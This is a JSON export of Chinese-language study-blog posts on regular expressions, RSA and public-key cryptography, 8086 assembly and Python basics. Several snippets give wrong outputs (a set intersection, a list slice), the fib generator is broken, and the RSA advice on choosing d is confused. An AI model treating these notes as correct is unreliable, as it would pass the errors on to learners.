[{"content":"基础语法 /pattern/flags: 匹配模式/修饰符\n修饰符 默认只匹配第一个 g: 全局匹配 i: 不区分大小写 m: 多行匹配 s: 使 . 中包含\\r\\n u: 能够正确处理UTF-16 y: 从剩余第一个位置开始匹配 转义符 \\特殊字符: 转义字符, 匹配特殊字符自身\n字符 普通字符: 匹配字符字面意义 \\cx: 匹配x指向的控制符 \\xn: 匹配16进制下ASCII编码中n指向的字符 \\un: 匹配16进制下Unicode编码中n指向的字符 \\f: 匹配换页符, 相当于\\x0c和\\cL \\n: 匹配换行符, 相当于\\x0a和\\cJ \\r: 匹配回车符, 相当于\\x0d和\\cM \\t: 匹配制表符, 相当于\\x09和\\cl \\v: 匹配垂直制表符, 相当于\\x0b和\\cK \\0: 匹配NULL, 相当于\\u0000 [\\b]: 匹配退格符, 相当于\\u0008\n字符类 [ ]: 匹配方括号内任意字符 [ - ]: 匹配方括号内字符范围 [^ ]: 匹配方括号内字符以外的字符 \\d: 匹配任意数字, 等价于[0-9] \\D: 匹配任意非数字, 等价于[^0-9] \\s: 匹配任意控制符, 等价于[\\f\\n\\r\\t\\v] \\S: 匹配任意非控制符, 等价于[^\\f\\n\\r\\t\\v] \\w: 匹配任意数字字母下划线, 等价于[A-Za-z0-9_] \\W: 匹配任意非数字字母下划线, 等价于[^A-Za-z0-9_] .: 通配, 等价于[^\\r\\n\\u2028\\u2029]\n定位符 ^: 匹配字符串开始位置 $: 匹配字符串结束位置 \\b: 匹配单词边界 \\B: 匹配非单词边界 量词：默认贪婪, 匹配尽可能多的字符 *: 匹配前面模式0次或多次 +: 匹配前面模式至少1次 ?: 匹配前面模式至多1次 {n}: 匹配前面模式恰好n次 {n,}: 匹配前面模式至少n次 {n,m}: 匹配前面模式至少n次, 至多m次 ?: 加在限定符后, 惰性, 匹配最少的字符\n分组符 (exp): 分组并捕获子表达式exp (?:exp): 分组但不捕获子表达式exp (exp)\\n: 分组并引用第n个捕获子表达式exp 断言符 exp1(?=exp2): 先行断言, 匹配在exp2前的exp1 exp1(?!exp2): 先行否定断言, 匹配不在exp2前的exp2 (?\u0026lt;=exp2)exp2: 后行断言, 匹配在exp2后的exp1 (?\u0026lt;!exp2)exp2: 后行否定断言, 匹配不在exp2后的exp2\n分支符 |: 匹配前面模式或后面模式\n优先级 转义符 字符类, 分组符, 断言符 量词 定位符, 字符 分支符\n匹配原理 DFA(Deterministic Finite Automata): 相同的输入总是转移到相同的状态. 机制: 先看字符串再看正则表达式, 不会发生回溯, 即已经匹配过的字符不会匹配多次. 语言: MySQL, awk, egrep, flex, lex.\nNFA(Nondeterministic Finite Automata): 相同输入可以转移到不同状态, 无输入时也可以转移状态. 机制: 先看正则表达式再看字符串, 会发生回溯, 速度较慢. 传统: 分支懒惰; Go, PCRE, Perl, PHP, Java, Python, Ruby, grep, less, more, .Net, vi. POSIX: 分支贪婪; mawk.\n贪婪与懒惰: 限定符默认为贪婪模式; 传统NFA默认为懒惰模式. 回溯陷阱: NFA实现的语言应当尽量避免回溯的发生以提高性能.\n","date":"2023-10-28T00:00:00Z","permalink":"https://example.com/p/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","title":"正则表达式"},{"content":"(C11 - GCC13.1.0)\n基础 使用对称加密, $n$ 个实体的网络需要 $\\frac{(n-1)n}{2}$ 个密钥及同等数量的保密信道, 密钥管理困难. 对称加密也难以解决签名和认证问题: 接收方可以伪造原文; 发送方可以否认行为.\n非对称加密基本条件: (1)安全 $k_e\\ne k_d$ 且由 $k_e$ 不能得到 $k_d$; (2) 保密: $D(E(m))=m$; (3)E和D高效; (4) 保真: $E(D(m))=m$.\n单向陷门函数: $y=f(x)$ 满足: (1)给定 $x$, 计算 $y$ 很容易; (2)给定$y$, 不掌握陷门, 计算 $x=f^{-1}(y)$ 很困难; (3)给定$y$, 掌握陷门, 计算 $xf^{-1}(y)$ 很容易.\n数学难题\n大合数分解难题: 大素数乘积容易 $p\\times q=n$, 大合数分解困难 $n=p\\times q$. 离散对数难题(DLP): 有限域 $GF(p)$ 上生成元幂乘容易 $a^b=c$, 求对数困难 $\\log_a c=b$. 椭圆曲线离散对数难题(ECDLP): 椭圆曲线群 $E_p(a,b)$ 中基点倍乘容易 $dP=Q$, 求倍数困难 $d=\\frac{Q}{P}$. 误差还原难题(LWE): 有限域 $GF(p)$ 上矩阵乘法加误差容易 $v=As+e$, 解带噪音的线性方程组困难 $s=A^{-1}(v-e)$. 工作方式\n发送方 $A$: 先用发送方私钥 $k_{Ad}$ 加密 $s=D(m,k_{Ad})$, 再用接收方公钥 $k_{Be}$ 加密 $c=E(s,k_{Be})$. 接收方 $B$: 先用接收方私钥 $k_{Bd}$ 解密 $s=E(c,k_{Bd})$, 再用发送方公钥 $k_{Ae}$ 解密 $m=D(s,k_{Ae})$. 真实性: 只有发送方有私钥 $k_{Ad}$, 只有发送方可以加密产生中间密文 $s$. 机密性: 只有接收方有私钥 $k_{Ae}$, 只有接收方可以解密得到明文 $m$. RSA RSA: 素数$p,q$, $n=pq$, ${\\rm gcd}(e,\\varphi(n))=1$, $\\varphi(n)=(p-1)(q-1)$.\n公钥 $(e,n)$, 加密 $c=E_{e,n}(m)\\equiv m^e({\\rm mod}\\ n)$. 私钥$d\\equiv e^{-1}({\\rm mod}\\ \\varphi(n))$, 解密 $m=D_{d,n}(m)$ 证明: $D_{d,n}(E_{e,n}(m))=m$, $E_{e,n}(D_{d,n}(c))=c$.\n即证 $m_{ed}\\equiv m^{(t\\varphi(n))+1} \\equiv m({\\rm mod}\\ n)$.\n${\\rm gcd}(M,n)=1$ 时, 有Euler定理 $m^{\\varphi(m)}\\equiv 1({\\rm mod}\\ n)$.\n${\\rm gcd}(M,n)\\ne 1$ 时, 由于 $m\\leq n$, 不妨设 $m = ap$, $a\\in\\mathbb{Z}$, 有 $m^{\\varphi(q)}\\equiv 1({\\rm mod}\\ q)$, 即 $m^t{\\varphi(n)}=bq+1$, $b\\in\\mathbb{Z}$, 故 $m^t{\\varphi(n)+1} = abn+M$.\n参数选取 $p,q$ 足够大, 一般场景使 $n$ 达到1024bit, 重要场景2048bit. $p,q$ 为强素数, $p-1,p+1,q-1,q+1$ 中均无除 $2$ 外的小因子. $p,q$ 位数不能相差过大或过小. 私钥 $d\\ne e$. ${\\rm gcd}(p-1,q-1)$ 尽可能小, 最好为2; 以避免密文迭代攻击. $e$ 应保证 $m^e\\ll n$; 有人建议为素数 $2^{16}+1=65537$, 二进制表示中仅含两位 $1$, 加密速度较快. $d$ 应较小以保证解密速度, 但确保$d\\ll \\frac{n}{4}$. 多个用户不得共用同一个模 $n$; 以避免共模攻击.\n大素数产生: Miller-Rabin测试.\n加密优化算法: 快速模幂, Montgomery.\n解密优化算法: CRT, 快速模幂, Montgomery.\nMontgomery: $a\\%m=a-k\\times\\lfloor[\\frac{a}{m}]\\rfloor$ 除法运算复杂度较高, 将模乘转换为乘法运算. 记 $a\u0026rsquo;\\equiv aR({\\rm mod}\\ m)$, $b\u0026rsquo;\\equiv bR({\\rm mod}\\ m)$, $R=2^k\u0026gt;m$, $m$ 为奇数, 即 ${\\rm gcd}(R,m)=1$; 此时 $a\u0026rsquo;R^{-1}=a\u0026rsquo;\u0026gt; \u0026gt;k$, $abR\\equiv (a\u0026rsquo;b\u0026rsquo;)R^{-1}({\\rm mod}\\ m)$, $ab\\equiv (abR)^R{-1}({\\rm mod}\\ m)$. $\\exists q$ s.t. $R|a+qm$, 有 $y=\\frac{a+qm}{R}\u0026lt;2m$; 不妨设 $xR-ym=1$, $0\u0026lt;y\u0026lt;R$, $0\u0026lt;x\u0026lt;m$, 有 $q\\equiv ay({\\rm mod}\\ R)$, 其中 $y\\equiv -m^{-1}({\\rm mod}\\ R)$.\n","date":"2023-10-18T00:00:00Z","permalink":"https://example.com/p/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/","title":"非对称加密"},{"content":"Intel 8086 - dosbox 0.74 - masm32\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # dosbox配置 (linux) sudo apt-get install dosbox # 下载MASM32, 仅保留如下文件: # debug.exe LINK.EXE MASM.EXE mkdir ASM mv debug.exe LINK.EXE MASM.EXE /home/xsndz/ASM ls -al vim .dosbox/dosbox-0.74.conf # 在文件末尾添加 mount c /home/xsndz/ASM # 将ASM挂载为dosbox的C盘 c: # 保存并关闭 :wq # 打开dosbox dosbox # 汇编并运行name.asm文件 (已在ASM路径下) masm c:\\name; # 生成目标文件 NAME.OBJ link name; # 生成可执行文件 NAME.EXE name # 进入debug模式 debug r # 查看, 修改寄存器内容 d # 查看内存内容 e # 修改内存内容 u # 将内存中机器指令翻译为汇编指令 t # 执行一条机器指令 a # 以汇编指令形式在内存中写入一条机器指令 q # 退出debug模式 基础概念 1 word(字) $=$ 2 Byte(字节/存储单元) $=$ 16 bit(位). 汇编指令是机器指令的助记符, 不同CPU都有不同的汇编指令集合, 存储器中指令和数据均为二进制信息. CPU: 运算器, 控制器, 寄存器. 存储: RAM(Random Access Memory), ROM(Read-Only Mememory)装有BIOS. CPU读写 地址总线宽度: 寻址能力 $2^N$ 个存储单元(Byte). 数据总线宽度: 数据传输能力 $2^N$ 位(bit). 控制总线宽度: 对其他器件控制能力. Intel 8086 16bit结构: 运算器一次最多处理16bit数据, 寄存器最大宽度16bit, 寄存器和运算器最大通路为16bit. 20bit地址总线: 地址加法器, 物理地址$=$段地址$\u0026lt; \u0026lt; 4 +$偏移地址. 地址分段是cpu行为, 实际上物理地址总是连续的. 00000-9FFFF为主存, A0000-BFFFF为显存, C0000-FFFFF为各类ROM. 寄存器 通用寄存器(16bit): AX(AH AL), BX(BH BL), CX(CH CL), DX(DH DL).\n1 2 3 4 5 mov ax,00FA ; ax = 00FA add al,26 ; ax = 0020 ; al被视为4bit寄存器, 进位被丢弃 mov bx,8226 ; bx = 8226 add bx,bx ; bx = 044C ; 进位被丢弃 add al,100 ; 错误, 指令操作对象位数应一致 (代码)段寄存器(16bit): CS. (指令)指针寄存器(16bit): IP. 从CS:IP指向的内存单元读取指令, 指令进入指令缓冲区. IP自增指向下一条指令. 指令缓冲区中指令执行. 1 2 3 jmp 3:0B16 ; cs = 0003, ip = 0B16 ; CPU从00B46处读取指令 mov bx,0B16 jmp bx ; ip = 0B16 字的存储: 小端序, 低位在低地址($n$), 高位在高地址($n+1$). (数据)段寄存器(16bit): DS. 数据偏移地址: [address]\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 mov bx,1000 ; bx = 1000 mov ds,bx ; ds = 1000 mov al,[0] ; 1000:0处数据读到al中 mov cx,23E4 ; cx = 23E4 mov [1],cx ; bx中数据写入1000:1处 ; 1000:1 E4 ; 1000:2 23 mov dx,[1] ; dx = 23E4 ; 段寄存器不能直接传入数据 mov ds,1000 ; 错误 add ds,ax ; 错误 mov cs,2C4E ; 错误 sub cs,bx ; 错误 ; 内存不能直接传入数据 mov [0],23E4 ; 错误 mov [0],E4 ; 错误 add [0],234F ; 错误 sub [0],2C ; 错误 ; 指针寄存器不可直接读写 mov [0],ip ; 错误 mov ax,ip ; 错误 add ip,ax ; 错误 sub ip,[0] ; 错误 ; 段寄存器可直接读写 mov [0],ds mov [2],cs mov ds,[2] mov cs,[0] 栈: 后进先出(LIFO). (栈)段寄存器(16bit): SS. (栈)指针寄存器(16bit): SP, 指向栈顶; 栈空时指向栈最高地址的下一个单元. 最大容量为64KB, sp范围0000~FFFF.\n1 2 3 4 5 6 7 8 9 10 mov ax,1000 mov ss,ax ; 栈范围: 1000:0~1000:F mov sp,0010 ; 栈置空 mov ax,0123 push ax ; sp = sp - 2, ax内容写入SS:SP处 mov bx,3210 push bx pop ax ; SS:SP处内容送入ax, sp = sp + 2 pop bx ; 8086并不限制栈越界(超顶或超底) 循环指令 转移指令 内中断 外中断 ","date":"2023-10-18T00:00:00Z","permalink":"https://example.com/p/%E6%B1%87%E7%BC%96%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/","title":"汇编快速入门"},{"content":" (3.9) 运算 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 # 除法自动转换为浮点数 35 / 5 # =\u0026gt; 7.0 # 向下取整除法 3 // -5 # =\u0026gt; -1 -5.0 // 3.0 # =\u0026gt; -2.0 # 取模正负与模数相同 -7 % 3 # =\u0026gt; 2 7 % -3 # =\u0026gt; -2 # 乘方 2 ** 4 # =\u0026gt; 16 # 逻辑运算符 True and 0 # =\u0026gt; False not -5 or False # =\u0026gt; True # 大小比较相连 1 \u0026lt; 3 \u0026lt; 2 # =\u0026gt; False 1 \u0026lt; 2 \u0026lt; 3 # =\u0026gt; True # if 表达式, 同比较元运算符\u0026#34; ? : \u0026#34; \u0026#34;python!\u0026#34; if 0 \u0026gt; 1 else \u0026#34;java!\u0026#34; # =\u0026gt; java! # is 表示是否为同个对象; == 表示值是否相同 a = [1,2,3,4] b = a b is a # =\u0026gt; True b = [1,2,3,4] b is a # =\u0026gt; False b == a # =\u0026gt; True # None 是一个对象, 只能用 is 判断 0 is None # =\u0026gt; False None is None # =\u0026gt; True # None, 0, 空字符串, 空列表, 空字典, 空元组都是 False bool(None) # =\u0026gt; False bool(0) # =\u0026gt; False bool(\u0026#34;\u0026#34;) # =\u0026gt; False bool([]) # =\u0026gt; False bool({}) # =\u0026gt; False bool(()) # =\u0026gt; False 变量 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 输出, 默认以空行结尾, 使用附加参数可改变结尾 print(\u0026#34;Hello world\u0026#34;, end = \u0026#34;!\u0026#34;) # =\u0026gt; Hello world! # 输入, 返回字符串 input_string_var = input(\u0026#34;Enter some data: \u0026#34;) # 自动数据类型, 不用声明 # 数字类型: 整型, 浮点型, 布尔型, 复数型; 布尔型是整型的子类; 不可变类型 a, b, c, d = 20, 5.5, True, 4+3j # 元组解包赋值 print(type(a), type(b), type(c), type(d)) # =\u0026gt; \u0026lt;class \u0026#39;int\u0026#39;\u0026gt; \u0026lt;class \u0026#39;float\u0026#39;\u0026gt; \u0026lt;class \u0026#39;bool\u0026#39;\u0026gt; \u0026lt;class \u0026#39;complex\u0026#39;\u0026gt; # 访问未赋值变量会抛出异常 some_unknown_var # =\u0026gt; NameError 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # 字符串类型 (string), 不可变类型 a = \u0026#34;This is a string\u0026#34; a[5] = \u0026#39;c\u0026#39; # =\u0026gt; TypeError # 字符串可以用单引号或双引号 \u0026#34;这是字符串\u0026#34; \u0026#39;这也是字符串\u0026#39; # 字符串连接 \u0026#34;Hello \u0026#34; + \u0026#34;World!\u0026#34; # =\u0026gt; \u0026#34;Hello World!\u0026#34; \u0026#34;Hello \u0026#34; \u0026#34;python!\u0026#34; # =\u0026gt; \u0026#34;Hello python!\u0026#34; 非变量形式时 # f-srings 格式化字符串, 大括号内可加入任何表达式 (3.6+) name = \u0026#34;python\u0026#34; f\u0026#34;{name} is {len(name)} characters long\u0026#34; # =\u0026gt; python is 6 characters long # .format 格式化字符串, 可使用参数或关键字 \u0026#34;{0} be nimble, {0} be quick, {0} jump over the {1}\u0026#34;.format(\u0026#34;Jack\u0026#34;, \u0026#34;candle stick\u0026#34;) # =\u0026gt; \u0026#34;Jack be nimble, Jack be quick, Jack jump over the candle stick\u0026#34; \u0026#34;{name} wants to eat {food}\u0026#34;.format(name = \u0026#34;Bob\u0026#34;, food = \u0026#34;lasagna\u0026#34;) # =\u0026gt; \u0026#34;Bob wants to eat lasagna\u0026#34; # %s 格式化字符串 (2.5-) \u0026#34;%s can be %s the %s way\u0026#34; % (\u0026#34;strings\u0026#34;, \u0026#34;interpolated\u0026#34;, \u0026#34;old\u0026#34;) # =\u0026gt; strings can be interpolated the old way 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 # 列表类型 (list), 可变类型 li = [] other_li = [4, 5, 6] # 尾插与尾删 li.append(1) # li 为 [1] li.append(2) # li 为 [1, 2] li.append(4) # li 为 [1, 2, 4] li.pop() # li 为 [1, 2] li.append(3) # li 为 [1, 2, 3] li.append(4) # li 为 [1, 2, 3, 4] # 存取同数组, 从 0 开始, -1 表示取尾 li[0] # =\u0026gt; 1 li[-1] # =\u0026gt;4 # 越界存取会抛出异常 li[5] # =\u0026gt; IndexError # 切割 list[begin:end:step], 范围相当于 [begin,end) li[1:3] # =\u0026gt; [2,3] li[2:] # =\u0026gt; [3,4] li[:3] # =\u0026gt; [1, 2, 4] li[::2] # =\u0026gt; [1,4] li[::-1] # =\u0026gt; [4, 3, 2, 1] li2 = li[:] # =\u0026gt; li2为[1, 2, 3, 4] li2 is li # =\u0026gt; False # 删除指定位置元素 del li2[2] # =\u0026gt; li2 为 [1, 2, 4] # 删除匹配的第一个元素, 无匹配时抛出异常 li.remove(2) # =\u0026gt; li 为 [1, 3, 4] li.remove(0) # =\u0026gt; ValueError: 0 is not in the list # 指定位置插入元素 li.insert(1,2) # =\u0026gt; li 为 [1, 2, 3, 4] # 获取匹配的第一个元素的位置, 无匹配时抛出异常 li.index(1) # =\u0026gt; 0 li.index(0) # =\u0026gt; ValueError: 0 is not in the list # 列表相加 li + li_other # =\u0026gt; [1, 2, 3, 4, 4, 5, 6] # 列表拼接 li.extend(li_other) # =\u0026gt; li 变为 [1, 2, 3, 4, 4, 5, 6] # in 判断是否包含值 6 in li_other # =\u0026gt; True # len 获取长度 len(li) # =\u0026gt; 7 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 # 元组类型 (tuple), 不可变类型 tup = (1, 2, 3) tup[0] # =\u0026gt; 1 tup[0] = 3 # =\u0026gt; TypeError 抛出异常 # 元素数量为1的元组必须要在末尾加逗号 type((1)) # =\u0026gt; \u0026lt;class \u0026#39;int\u0026#39;\u0026gt; type((1,)) # =\u0026gt; \u0026lt;class \u0026#39;tuple\u0026#39;\u0026gt; type(()) # =\u0026gt; \u0026lt;class \u0026#39;tuple\u0026#39;\u0026gt; # 大部分操作同列表, 更改元素除外 len(tup) # =\u0026gt; 3 tup + (4, 5, 6) # =\u0026gt; (1, 2, 3, 4, 5, 6) tup[:2] # =\u0026gt; (1, 2) 2 in tup # =\u0026gt; true # 元组解包赋值 a, b, c = (1, 2, 3) # a 为 1, b 为 2, c 为 3 # 扩展解包 a, *b, c = (1, 2, 3, 4) # a 为 1, b 为 [2, 3], c 为 3 # 元组括号可省略 d, e, f = 4, 5, 6 # 交换变量值 e, d = d, e # d 为 5, e 为 4 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 # 字典类型 (dictionary), 可变类型, 存储 key 和 value 的映射关系 empty_dict = {} filled_dict = {\u0026#34;one\u0026#34;: 1, \u0026#34;two\u0026#34;: 2, \u0026#34;three\u0026#34;: 3} # key 必须为不可变类型且无重复值, 为确保 key 被转换为唯一的 hash-value 以用于快速查询 invalid_dict = {[1, 2, 3]: \u0026#34;123\u0026#34;} # =\u0026gt; TypeError: unhashable type \u0026#39;list\u0026#39; 抛出异常 valid_dict = {(1, 2, 3): [1, 2, 3]} # =\u0026gt; value 可为任何类型 # in 只能判断字典中是否包含 key \u0026#34;one\u0026#34; in filled_dict # =\u0026gt; True 1 in filled_dict # =\u0026gt; False # [key] 取值, key 不存在时抛出异常 filled_dict[\u0026#34;one\u0026#34;] # =\u0026gt; 1 filled_dict[\u0026#34;four\u0026#34;] # =\u0026gt; KeyError # 用 .get(key) 避免异常, 不存在时返回默认值, 无默认值时返回 None filled_dict.get(\u0026#34;one\u0026#34;, 4) # =\u0026gt; 1 filled_dict.get(\u0026#34;four\u0026#34;, 4) # =\u0026gt; 4 filled_dict.get(\u0026#34;four\u0026#34;) # =\u0026gt; None # 用 .keys() 获取所有 key, 用 .values() 获取所有 value # 返回可迭代对象, 需要包含在 list() 中以转换为列表 # (3.7-) 无序, (3.7+) 按照插入顺序 list(filled_dict.keys()) # =\u0026gt; [\u0026#34;one\u0026#34;, \u0026#34;two\u0026#34;, \u0026#34;three\u0026#34;] (3.7+) list(filled_dict.values()) # =\u0026gt; [1, 2, 3] (3.7+) # .setdefault() 在 key 不存在时插入新项 filled_dict.setdefault(\u0026#34;four\u0026#34;, 5) # =\u0026gt; \u0026#34;four\u0026#34;: 5 filled_dict.setdefault(\u0026#34;four\u0026#34;, 4) # =\u0026gt; \u0026#34;four\u0026#34;: 5 # 用 .update(key, value) 赋值 filled_dict.update(\u0026#34;four\u0026#34;, 4) filled_dict[\u0026#34;five\u0026#34;] = 5 # 另一种赋值方法 # del 删除项 del filled_dict[\u0026#34;five\u0026#34;] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # 集合类型 (set), 可变类型, 元素必须为不可变类型, 元素不会重复 empty_set = set() some_set = {1, 1, 2, 2, 3, 4} # some_set 为 {1, 2, 3, 4} invalid_set = {[1], 1} # =\u0026gt; TypeError: unhashable type \u0026#39;list\u0026#39; 抛出异常 # 集合运算 other_set = {3, 4, 5, 6} some_set \u0026amp; other_set # =\u0026gt; {3, 4, 5} 取交集 some_set | other_set # =\u0026gt; {1, 2, 3, 4, 5, 6} 取并集 some_set - other_set # =\u0026gt; {1, 2} 取差集 some_set ^ other_set # =\u0026gt; {1, 2, 5, 6} 取对称差集 # 用 .add() 添加元素 some_set.add(5) # 用 .discard 删除元素 some_set.discard(5) some_set.discard(6) # =\u0026gt; 不会抛出异常 # 用 .copy() 复制集合 filled_set = some_set.copy() filled_set is some_set # =\u0026gt; False # in 判断元素是否在集合内 5 in some_set # =\u0026gt; False 流程控制 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 # if 判断 some_var = 5 if some_var \u0026gt; 10: print(\u0026#34;some_var is bigger than 10.\u0026#34;) # 4个空格缩进 elif some_var \u0026lt; 10: print(\u0026#34;some_var is smaller than 10.\u0026#34;) else: print(\u0026#34;some_var is indeed 10.\u0026#34;) # for 循环 for animal in [\u0026#34;dog\u0026#34;, \u0026#34;cat\u0026#34;, \u0026#34;mouse\u0026#34;]: print(\u0026#34;{} is a mammal\u0026#34;.format(animal)) for i in range(4) # 遍历 0, 1, 2, 3 for i in range(4, 8) # 遍历 4, 5, 6, 7 for i in range(4, 8, 2) # 遍历 4, 6 animals = [\u0026#34;dog\u0026#34;, \u0026#34;cat\u0026#34;, \u0026#34;mouse\u0026#34;] for i, value in enumerate(animals): print(i, value, end = \u0026#34;, \u0026#34;) # =\u0026gt; 0 dog, 1 cat, 2 mouse, # while 循环 x = 0 while x \u0026lt; 4: print(x) x += 1 # 异常处理 try: raise IndexError(\u0026#34;This is an index error\u0026#34;) except IndexError as e: pass # 此处应处理错误 except (TypeError, NameError): pass # 可同时处理不同类错误 else: print(\u0026#34;All good!\u0026#34;) finally: print(\u0026#34;We can clean up resources here.\u0026#34;) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 contents = {\u0026#34;aa\u0026#34;: 12, \u0026#34;bb\u0026#34;: 21} with open(\u0026#34;file1.txt\u0026#34;, \u0026#34;w+\u0026#34;) as file: file.write(str(contents)) # 字符串写入文件 with open(\u0026#34;file2.txt\u0026#34;, \u0026#34;w+\u0026#34;) as file: file.write(json.dumps(contents)) # 对象写入文件 with open(\u0026#34;file1.txt\u0026#34;, \u0026#34;r+\u0026#34;) as file: contents = file.read() # 读取文件字符串 print(contents) with open(\u0026#34;file2.txt\u0026#34;, \u0026#34;r+\u0026#34;) as file: contents = json.load(file) # 读取文件对象 print(contents) # windows 调用 open() 默认为 ANSI # 读写 utf-8 需指定 encoding = \u0026#34;utf-8\u0026#34; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 # 可迭代对象 (iterable) : 可遍历, 但不能随机访问, 可以生成迭代器 filled_dict = {\u0026#34;one\u0026#34;: 1, \u0026#34;two\u0026#34;: 2, \u0026#34;three\u0026#34;: 3} our_iterable = filled_dict.keys() print(our_iterable) for i in our_iterable: # 遍历可迭代对象 print(i) our_iterable[1] # TypeError 抛出异常 our_iterator = iter(our_iterable) # 生成迭代器 # 迭代器 (iterator) 可以记住遍历位置对象 print(next(our_iterator)) # =\u0026gt; one print(next(our_iterator)) # =\u0026gt; two print(next(our_iterator)) # =\u0026gt; three print(next(our_iterator)) # =\u0026gt; StopIteration # for 内部实现了迭代 our_iterator = iter(our_iterable) for i in our_iterator: print(i) # 可用 list 一次性取出可迭代对象或迭代器所有元素 list(filled_dict.keys()) # =\u0026gt; [\u0026#34;one\u0026#34;, \u0026#34;two\u0026#34;, \u0026#34;three\u0026#34;] list(our_iterator) # =\u0026gt; [] # 生成器 (generator), 实现惰性运算, 只有在需要时计算下一个值 values = (-x for x in [1, 2, 3, 4, 5]) gen_to_list = list(values) print(gen_to_list) # =\u0026gt; [-1, -2, -3, -4, -5] # 生成器函数中 yield 返回并暂停迭代 def fib(n): prev, curr = 0, 1 while n \u0026gt; 0 max -= 1 yield curr prev, curr = curr, prev + curr 函数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 # def 定义函数 def add(x, y): print(\u0026#34;x is {} and y is {}.\u0026#34;.format(x, y)) return x + y add(5, 6) add(y = 6, x = 5) # 关键词参数可为任意顺序 # 可变参数函数 def varargs(*args): # * 展开元组 return args varargs(1, 2, 3) # =\u0026gt; (1, 2, 3) def keyword_args(**kwargs): # ** 展开字典 return kwargs keyword_args(big = 1, small = 0) # =\u0026gt; {\u0026#34;big\u0026#34;: 1, \u0026#34;small\u0026#34;: 0} def all_args(*args, **kwargs): # 混用参数 print(args, end = \u0026#34;, \u0026#34;) print(kwargs) args = (1, 2, 3, 4) kwargs = {\u0026#34;a\u0026#34;: 1, \u0026#34;b\u0026#34;: 2, \u0026#34;c\u0026#34;: 3} all_args(*args) # =\u0026gt; (1, 2, 3, 4), {} all_args(**kwargs) # =\u0026gt; (), {\u0026#34;a\u0026#34;: 1, \u0026#34;b\u0026#34;: 2, \u0026#34;c\u0026#34;: 3} all_args(*args,**kwargs) # =\u0026gt; (1, 2, 3, 4), {\u0026#34;a\u0026#34;: 1, \u0026#34;b\u0026#34;: 2, \u0026#34;c\u0026#34;: 3} # 返回元组 def swap(x, y): return y, x x, y = 1, 2 x, y = swap(x, y) # =\u0026gt; x = 2, y = 1 # 函数作用域 x = 5 def set_x(num): x = num def set_global_x(num): global x x = num set_x(0) print(x) # =\u0026gt; 5 set_global_x(1) print(x) # =\u0026gt; 1 # 函数是 \u0026#34;一等公民\u0026#34; def create_adder(x): def adder(y): return x + y return adder add_10 = create_adder(10) add_10(3) # =\u0026gt; 13 # 匿名函数 func1 = lambda x: x \u0026gt; 2 func2 = lambda x, y: x ** 2 + y ** 2 func1(3) # =\u0026gt; True func2(2, 1) # =\u0026gt; 5 # 高阶函数: map 映射, filter 过滤 list(map(add_10, [1, 2, 3])) # =\u0026gt; [11, 12, 13] list(map(max, [1, 2, 3], [4, 2, 1])) # =\u0026gt; [4, 2, 3] list(filter(lambda x: x \u0026gt; 5, [3, 4, 5, 6, 7])) # =\u0026gt; [6, 7] # 推导式: 列表, 字典, 集合 [add_10(i) for i in [1, 2, 3]] # =\u0026gt; [11, 12, 13] [x for x in [3, 4, 5, 6, 7] if x \u0026gt; 5] # =\u0026gt; [6, 7] {x for x in \u0026#39;abcddeef\u0026#39; if x not in \u0026#39;abc\u0026#39;} # =\u0026gt; {\u0026#39;d\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;f\u0026#39;} {x: x ** 2 for x in range(5)} # =\u0026gt; {0: 0, 1: 1, 2: 4, 3: 9, 4: 16} 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 模块本质为python文件 # 导入模块 import math math.sqrt(16) # =\u0026gt; 4.0 # 导入模块中的具体函数 from math import ceil, floor ceil(3.9) # =\u0026gt; 4.0 floor(3.9) # =\u0026gt; 3.0 # 模块名称简化 import math as m m.sqrt(16) # =\u0026gt; 4.0 # 查看模块中的函数和字段 import math dir(math) # 模块重名时, 本地文件优先级高于内建库 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # 函数闭包: 返回的子函数调用外层函数变量 def outer(x) def inner(y): return x + y return inner # 装饰器: 利用函数闭包思路, 在不改变原函数下添加新功能 from functools import wraps def beg(target_function): @wraps(target_function) def wrapper(*args, **kwargs): msg, say_please = target_function(*args, **kwargs) if say_please: return \u0026#34;{} {}\u0026#34;.format(msg, \u0026#39;Please! I am poor :(\u0026#39;) return msg return wrapper @beg def say(say_please = False): msg = \u0026#39;Can you buy me a cup of coffee?\u0026#39; return msg, say_please print(say()) # =\u0026gt; \u0026#34;Can you buy me a cup of coffee?\u0026#34; print(say(say_please = True)) # =\u0026gt; \u0026#34;Can you buy me a cup of coffee? Please! I am poor :(\u0026#34; 类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 